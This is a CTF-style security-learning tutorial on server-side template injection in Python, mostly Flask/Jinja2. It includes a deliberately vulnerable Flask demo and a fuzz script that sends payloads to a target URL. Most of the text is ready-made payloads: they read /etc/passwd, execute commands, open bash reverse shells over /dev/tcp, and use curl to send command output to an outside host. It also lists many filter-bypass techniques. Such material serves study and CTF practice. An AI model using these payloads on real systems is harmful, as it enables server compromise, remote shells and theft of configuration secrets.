# Python安全学习—SSTI模板注入

Author: H3rmesk1t

Data: 2021.09.09

# SSTI简介
- MVC是一种框架型模式，全名是Model View Controller
- 即模型(model)－视图(view)－控制器(controller)，在MVC的指导下开发中用一种业务逻辑、数据、界面显示分离的方法组织代码，将业务逻辑聚集到一个部件里面，在改进和个性化定制界面及用户交互的同时，得到更好的开发和维护效率
- 在MVC框架中，用户的输入通过 View 接收，交给 Controller ，然后由 Controller 调用 Model 或者其他的 Controller 进行处理，最后再返回给 View ，这样就最终显示在我们的面前了，那么这里的 View 中就会大量地用到一种叫做模板的技术
- 绕过服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，而模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就会导致敏感信息泄露、代码执行、GetShell 等问题
- 虽然市面上关于SSTI的题大都出在python上，但是这种攻击方式请不要认为只存在于 Python 中，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言

# 常见的模板引擎
## PHP
- Smarty：Smarty 算是一种很老的 PHP 模板引擎，使用的比较广泛

- Twig：Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用，它的操作有点像 Mustache 和 liquid

- Blade：Blade 是 Laravel 提供的一个既简单又强大的模板引擎，和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码，所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给应用增加任何额外负担

## JAVA
- JSP：这个是一个非常的经典 Java 的模板引擎

- FreeMarker：是一种基于模板和要改变的数据，并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具， 它不是面向最终用户的，而是一个 Java 类库，是一款程序员可以嵌入他们所开发产品的组件

- Velocity：Velocity 作为历史悠久的模板引擎不单单可以替代 JSP 作为 Java Web 的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力

## PYTHON
- Jinja2：flask jinja2 一直是一起说的，使用非常的广泛

- django：django 应该使用的是专属于自己的一个模板引擎，django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的

- tornado：tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发

## RUBY
ERB：全称是Embedded RuBy，意思是嵌入式的Ruby，是一种文本模板技术，和 JSP 的语法很像

## GOLANG
- 关于 Golang Template 的 SSTI 研究目前来说还比较少，可能是因为本身设计的也比较安全，现在一般是点和作用域的问题


# SSTI产生的原因
- 服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题

# 常用检测工具 Tplmap
- 工具地址：[https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)

<img src="https://pic.imgdb.cn/item/6139ba0044eaada739bb78bb.png" alt="">

<img src="https://pic.imgdb.cn/item/6139ba1344eaada739bb9b53.png" alt="">

# Flask/Jinja模板引擎的相关绕过
- 由于 Flask/Jinja 模板引擎的出现漏洞的几率较大，网上对于这方面的分析的文章也很多，这里对其做个总结

## Flask简介
- Flask 是一个用 Python 编写的 Web 应用程序框架，其优点是提供给用户的扩展能力很强，框架只完成了简单的功能，有很大一部分功能可以让用户自己选择并实现

## demo漏洞代码

```python
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string
app = Flask(__name__)
@app.route('/test',methods=['GET', 'POST'])
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </div
    ''' %(request.url)
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='127.0.0.1', debug=True)
```

## 基础知识
### 沙盒逃逸
- 沙箱逃逸就是在一个代码执行环境下 (Oj 或使用 socat 生成的交互式终端)，脱离种种过滤和限制，最终成功拿到 shell 权限的过程

### Python的内建函数
- 启动 python 解释器时，即使没有创建任何变量或函数还是会有很多函数可供使用，这些就是 python 的内建函数
- 在 Python 交互模式下，使用命令 `dir('builtins')` 即可查看当前 Python 版本的一些内建变量、内建函数，内建函数可以调用一切函数

<img src="https://pic.imgdb.cn/item/6139bd9644eaada739c1e1a5.png" alt="">

### 名称空间
- 要了解内建函数是如何工作的，首先需要需要了解一下名称空间，Python 的名称空间是从名称到对象的映射，在 Python 程序的执行过程中至少会存在两个名称空间

1. 内建名称空间：Python 自带的名字，在 Python 解释器启动时产生，存放一些 Python 内置的名字
2. 全局名称空间：在执行文件时，存放文件级别定义的名字
3. 局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效

- 加载顺序：内置名称空间 —全局名称空间 —局部名称空间
- 名字的查找顺序：局部名称空间 —全局名称空间 —内置名称空间

### 类继承
- 构造 Python-SSTI 的 Payload 需要什么是类继承
- Python 中一切均为对象，均继承于 object 对象，Python 的 object 类中集成了很多的基础函数，假如需要在 Payload 中使用某个函数就需要用 object 去操作

- 常见的继承关系的方法有以下三种:
1. __base__：对象的一个基类，一般情况下是 object
2. __mro__：获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object 在最底层所以在列表中的最后，通过 __mro__[-1] 可以获取到
3. __subclasses__()：继承此对象的子类，返回一个列表

- 攻击方式为：变量 -对象 -基类 -子类遍历 -全局变量

## 寻找Python-SSTI攻击载荷的过程
### 攻击载荷过程
- 获取基本类
```python
对于返回的是定义的Class类的话:
__dict__          //返回类中的函数和属性，父类子类互不影响
__base__          //返回类的父类 python3
__mro__           //返回类继承的元组，(寻找父类) python3
__init__          //返回类的初始化方法   
__subclasses__()  //返回类中仍然可用的引用  python3
__globals__       //对包含函数全局变量的字典的引用 python3

对于返回的是类实例的话:
__class__         //返回实例的对象，可以使类实例指向Class，使用上面的魔术方法
```
```python
''.__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__._
_bases__[0]
```

- In addition, after introducing the relevant modules of Flask/Jinja, you can also obtain the basic class through the following characters
```python
config
request
url_for
get_flashed_messages
Self
redirect
```

- After obtaining the base class, continue to get the subclass of the base class (object) downwards

```python
object.__subclasses__()
```

- Find the overloaded `__init__` class. After obtaining the initialization property, the description with `wrapper` is not overloaded. Look for those without `warpper`; you can also use `.index()` to find `file`, `warnings.catch_warnings`

```python
''.__class__.__mro__[2].__subclasses__()[99].__init__
<slot wrapper '__init__' of 'object' objects>

''.__class__.__mro__[2].__subclasses__()[59].__init__
<unbound method WarningMessage.__init__>
```

- View its reference `__builtins__`

```python
''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__']
```

- Here we will return the dict type, look for functions available in keys, and use functions such as file in keys to implement the function of reading files.

```python
''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()
```

### Commonly used target functions
```python
file
subprocess.Popen
os.popen
exec
eval
```

### Common intermediate objects
```python
catch_warnings.__init__.func_globals.linecache.os.popen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1')
lipsum.__globals__.__builtins__.open("/flag").read()
linecache.os.system('ls')
```

### fuzz available class scripts
- For example, for subprocess.Popen, you can construct the following fuzz script

```python
import requests

url = ""

index = 0
for i in range(100, 1000):
    #print i
    payload = "{{''.__class__.__mro__[-1].__subclasses__()[%d]}}" % (i)
    params = {
        "search": payload
    }
    #print(params)
    req = requests.get(url,params=params)
    #print(req.text)
    if "subprocess.Popen" in req.text:
        index = i
        break


print("index of subprocess.Popen:" + str(index))
print("payload:{{''.__class__.__mro__[2].__subclasses__()[%d]('ls',shell=True,stdout=-1).communicate()[0].strip()}}" % i)
```

### Server fuzz
- Use the `{%for%}` statement block to fuzz on the server

```python
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
  {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}
  {% endif %}
{% endfor %}
```

### Commonly used command execution methods in Python
1. os.system(): The parameter of this method is a command of type string. The return value on linux is the exit value of the execution command; while the return value on Windows is the return value of the shell after running the command; Note: This function returns the return value of the command execution result, not the execution output of the command (return 0 for success, return -1 for failure)

2. os.popen(): The object returns is a file read object. If you want to get the output of the execution command, you need to call the read() method of the object.

## Python-Web Framework Configuration File
### Tornado
- `handler.settings`: handler.settings-RequestHandler.application.settings, you can get the current application.settings, and get sensitive information from it.

### flaks
- Built-in function: config is a global object in the Flask template, representing "current configuration object (flask.config)". It is an object of a dictionary class that contains the configuration values ​​of all applications. In most cases, it contains sensitive values ​​such as database link strings, credentials connected to third-party, SECRET_KEY, etc.
- url_for(): used to reverse parse to generate url
- get_flashed_messages(): used to get flash messages
```python
{{url_for.__globals__['__builtins__'].__import__('os').system('ls')}}

If {{config}} is filtered and the framework is flask, you can use the following payload instead

{{get_flashed_messages.__globals__['current_app'].config}}
{{url_for.__globals__['current_app'].config}}
```

## Flask filter
### Definition
- The function of flask filters is almost the same as that of filters in other languages. To filter data, you can refer to the php://filter protocol in the php pseudo protocol, which supports chain filtering.

###How to use
```python
Variables | Filters
variable|filter(args)
variable|filter //If the filter has no parameters, you can not add brackets
```

### Filters used
```python
int(): Convert the value to type int;

float(): Convert the value to float type;

lower(): converts string to lowercase;

upper(): converts string to uppercase;

title(): convert the first letter of each word in the value to capitalize;

capitalize(): converts the first letter of the variable value to uppercase, and the remaining letters to lowercase;

trim(): intercepts the whitespace characters before and after the string;

wordcount(): calculates the number of words in a long string;

reverse(): string inversion;

replace(value,old,new): replace the string that replaces old with new;

truncate(value,length=255,killwords=False): intercepts the string of length length;

striptags(): Delete all HTML tags in the string. If multiple spaces appear, they will be replaced with one space;

escape() or e: escape character, which will escape symbols such as <, > into symbols in HTML, and exemplify examples: content|escape or content|e;

safe(): Disable HTML escape. If global escape is enabled, the safe filter will turn off the escape of the variable. Example: {{'<em>hello</em>'|safe}};

list(): list variables into a list;

string(): converts variables into strings;

join(): splice parameter values ​​in a sequence into strings;

abs(): Returns the absolute value of a numeric value;

first(): Returns the first element of a sequence;

last(): Returns the last element of a sequence;

format(value,arags,*kwargs): Format string, for example: {{ "%s" - "%s"|format('Hello?',"Foo!") }} will output: Hello? - Foo!

length(): Returns the length of a sequence or dictionary;

sum(): Returns the sum of the values ​​in the list;

sort(): Returns the sorted list;

default(value,default_value,boolean=false): If the current variable has no value, the value in the parameter will be used instead. Example: name|default('xiaotuo')---If name does not exist, Xiaotuo will be used instead. boolean=False By default, the value in default will be used only when this variable is undefined. If you want to use pytho
The form of n determines whether it is false, then you can pass boolean=true, or you can use or to replace it
```

## Module search script
- Python2

```python
num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if 'os' in item.__init__.__globals__:
            print num,item
        num+=1
    except:
        num+=1
```

- Python3

```python
#!/usr/bin/python3
# coding=utf-8
#python 3.5
#jinja2 template
from flask import Flask
from jinja2 import Template
# Some of special names
searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattr__', '__getattribute__', '__dir__', '__delattr__', '__delattr__', '__get__', '__set__', '__set__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__', '__mul__']
neededFunction = ['eval', 'open', 'exec']
pay = int(input("Payload?[1|0]"))
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    for attr in searchList:
        if hasattr(i, attr):
            if eval('str(i.'+attr+')[1:9]') == 'function':
                for goal in neededFunction:
                    if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                        if pay != 1:
                            print(i.__name__,":", attr, goal)
                        else:
                            print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")
```

## Common Payloads
- Python2

```python
#python2 has file
#Read password
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
#Write a file
''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')
#OS module
system
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
popen
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()
#eval
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
#__import__
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
#Rebound shell
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i >& /dev/tcp/your server address/port 0>&1').read()
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i >& /dev/tcp/xxxx/9999 0>&1"')
Note that the Payload cannot be executed directly in the URL, because the existence of & will cause errors in URL parsing. You can use tools such as burp.
#request.environ
Object dictionary related to server environment
```

- Python3

```python
#python3 does not have a file, it uses open
#File reading
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
{{().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("dir").read()')}}
#Command Execution
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')
```
- You can refer to: [https://github.com/payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)

## Common available classes
- File Reading_Method 1_Submodule Utilization
- Existing submodules can be queried through `.index()` and return the index if it exists

```python
''.__class__.__mro__[2].__subclasses__().index(file)
```

- `flie` class: (get the parent class of `str` in the object type of the string, and find all its subclasses in its `object` parent class, the 41st is the `file` class)

```python
''.__class__.__mro__[2].__subclasses__()[40]('<File_To_Read>').read()
```

- `_frozen_importlib_external.FileLoader` class: (like the pre-query, it is the 91st class)

```python
''.__class__.__mro__[2].__subclasses__()[91].get_data(0,"<file_To_Read>")
```

- File Reading_Method 2_Parasing through Functions->Basic Class->Basic Class Subclass->Recent
Loading Class->Reference->Find Available Functions

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read() #Modify read() to write() to write file
```

- Command execution_Method 1_Use `eval` for command execution

```python
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')
```

- Command execution_Method 2_Use `warnings.catch_warnings` for command execution

```python
Check the location of the warnings.catch_warnings method
[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)

View the location of linecatch
[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')

Find the location of the os module
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')

Find the location of the system method (using os.open().read() here can achieve the same effect, the steps are the same, and no longer repeat it)
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')

Call the system method
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
```

- Command execution_Method 3_Use `commands` for command execution

```python
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
```

## What Ideas when encountering SSTI questions
- Consider viewing configuration files or considering command execution

## Fancy bypass
### Bypass brackets
- The `pop()` function is used to remove an element in the list (the last element by default) and return the value of that element, or use `getitem`

```python
__mro__[2]== __mro__.__getitem__(2)
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
```

### Bypass quotation marks
- `request.args, request.values, request.cookies` are attributes in flask. To return the requested parameter, here the path is used as the variable name, and the following path is passed in and the filtering of quotes is bypassed.

```python
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
```

### Bypass double underscore
- Also utilize `request.args, request.values, request.cookies`

```python
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

### Splicing bypass
```python
object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
```

### Encoding bypass
```python
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64'))(
Equivalent to
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")
```

### Bypass {{or}}
- Bypass using `{%`
```python
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
```

### Bypass.
- You can use `attr()` or `[]` to bypass

```python
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}

{{ config['__class__']['__init__']['__globals__']['os']['popen']('dir')['read']() }}
```

### Filter parentheses
- Overload the function execution method, for example, `request.__class__.__getitem__=__builtins__.exec;`, then when executing `request[payload]` is equivalent to `exec(payload)`, use lambda expression to bypass

### Bypass _ and quotes
- Can be bypassed with `|attr`
```python
{{()|attr(request.values.a)}}&a=class
```
- Bypass using the `request` object, assuming that `__class__` is filtered can be replaced with the following form
```python
{{''[request.args.t1]}}&t1=__class__
#If request.args is changed to request.values, use post to pass parameters

{{''[request['args']['t1']]}}&t1=__class__
#If you use POST, just change args to form
```

### Keyword filtering
- base64 encoding bypass

```python
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
```

- String stitching bypass

```python
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses_
_()[40]("/etc/passwd").read()}}
```

-Use dict splicing

```python
{% set a=dict(o=x,s=xx)|join %}
```

-Use string
- For example, `'` can be obtained in the following way and stored in the `quote`
```python
{% set quote = ((app.__doc__|list()).pop(337)|string())%}
Something similar
{% set sp = ((app.__doc__|list()).pop(102)|string)%}
{% set pt = ((app.__doc__|list()).pop(320)|string)%}
{% set lb = ((app.__doc__|list()).pop(264)|string)%}
{% set rb = ((app.__doc__|list()).pop(286)|string)%}
{% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%}
{% set xhx = (({ }|select()|string()|list()).pop(24)|string())%}
```

- The obtained characters can be concatenated by `~`
- For example, an eval payload

```python
{% set xhx = (({ }|select()|string|list()).pop(24)|string)%}
{% set sp = ((app.__doc__|list()).pop(102)|string)%}
{% set pt = ((app.__doc__|list()).pop(320)|string)%}
{% set quote = ((app.__doc__|list()).pop(337)|string)%}
{% set lb = ((app.__doc__|list()).pop(264)|string)%}
{% set rb = ((app.__doc__|list()).pop(286)|string)%}
{% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%}
{% set bu = dict(buil=x,tins=xx)|join %}
{% set im = dict(imp=x,ort=xx)|join %}
{% set sy = dict(po=x,pen=xx)|join %}
{% set oms = dict(o=x,s=xx)|join %}
{% set fl4g = dict(f=x,lag=xx)|join %}
{% set ca = dict(ca=x,t=xx)|join %}
{% set ev = dict(ev=x,al=xx)|join %}
{% set red = dict(re=x,ad=xx)|join%}
{% set bul = xhx*2~bu~xhx*2 %}
{% set payload = xhx*2~im~xhx*2~lb~quote~oms~quote~rb~pt~sy~lb~quote~ca~sp~slas~fl4g~quote~rb~pt~red~lb~rb %}
```

- Python3 Normalization of Unicode, resulting in exec being able to execute unicode code

<img src="https://pic.imgdb.cn/item/6139ce6f44eaada739f4aef2.png" alt="">

- Python's formatted string properties

```python
{{""['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]}}
```

- getlist, use the `.getlist()` method to obtain a list, and the parameters of this list can be passed later

```python
{%print (request.args.getlist(request.args.l)|join)%}&l=a&a=_&a=_&a=class&a=_&a=_
```

### Object level disabled
- set {}=None, you can only set the object to None, and the object can also be found through other references

```python
{{% set config=None%}} -{{url_for.__globals__.current_app.config}}
```

- del

```python
del __builtins__.__dict__['__import__']
```

- Reload through reload to restore built-in functions

```python
reload(__builtins__)
```

### Filter config, request and class
- There is a session object in the official document. Session is a dict object, so the corresponding class can be accessed through the key method. Since the key is a string, it can be bypassed by string splicing. Payload: `{{ session['__cla'+'ss__'] }}` can bypass filtering and access the class, and then access the base class, execute commands, etc.

### Filter config, request, class, __init__, file, __dict__, __builtines__, __import__, getattr and os
- There is a `__enter__` method in Python3, and there is also a `__globals__` method available, and it is exactly the same as `__init__`

```python
__init__ (allocation of the class)
__enter__ (enter context)
__exit__ (leaving context)

{{ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('cat /etc/passwd').read() }}
```

## trick
### Several ways to represent Python characters
```python
Hexadecimal \x41

Eight \101

unicode \u0074

base64 'X19jbGFzc19f'.decode('base64') python3

join "fla".join("/g")

slice "glaf"[::-1]

lower/upper ["__CLASS__"|lower

format "%c%c%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)

replace "__claee__"|replace("ee","ss")

reverse "__ssalc__"|reverse
```

### Several ways to get key values ​​or subscripts in Python dictionary or list
```python
dict['__builtins__']

dict.__getitem__('__builtins__')

dict.pop('__builtins__')

dict.get('__builtins__')

dict.setdefault('__builtins__')

list[0]

list.__getitem__(0)

list.pop(0)
```

### Several ways to obtain object elements in SSTI
```python
class.attr

class.__getattribute__('attr')

class['attr']

class|attr('attr')

"".__class__.__mro__.__getitem__(2)

['__builtins__'].__getitem__('eval')

class.pop(40)
```

### request bypass injection
```python
request.args.name #GET name

request.cookies.name #COOKIE name

request.headers.name #HEADER name

request.values.name #POST or GET Name

request.form.name #POST NAME

request.json #Content-Type json
```

###Realize config reading by getting the current_app object to obtain the context information of the current flask App
```python
{{url_for.__globals__.current_app.config}}

{{url_for.__glo
bals__['current_app'].config}}

{{get_flashed_messages.__globals__['current_app'].config.}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].cofig}}
```

### Special variables
- url_for, g, request, namespace,lipsum,range,session,dict,get_flashed_messages,cycler,joiner,config, etc. When config and self are filtered, but still need to obtain configuration information, you need to go from its upper global variables (access the configuration current_app, etc.)

```python
{{url_for.__globals__['current_app'].config.FLAG}}

{{get_flashed_messages.__globals__['current_app'].config.FLAG}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}